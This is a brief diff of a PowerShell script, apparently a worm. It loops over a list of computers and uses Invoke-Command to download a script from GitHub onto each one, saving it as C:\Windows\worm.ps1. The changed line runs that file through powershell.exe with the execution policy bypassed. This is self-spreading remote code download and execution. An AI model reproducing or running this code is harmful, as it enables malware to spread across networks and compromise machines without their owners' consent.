@@ -15,7 +15,7 @@ Foreach($i in $computerNames){
                 Invoke-Command -ScriptBlock {
                 $WebClient = New-Object System.Net.WebClient
                 $WebClient.DownloadFile("https://github.com/Magrene/PowershellShell/blob/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
-                C:\Windows\worm.ps1
+                C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                 }
             }
             }
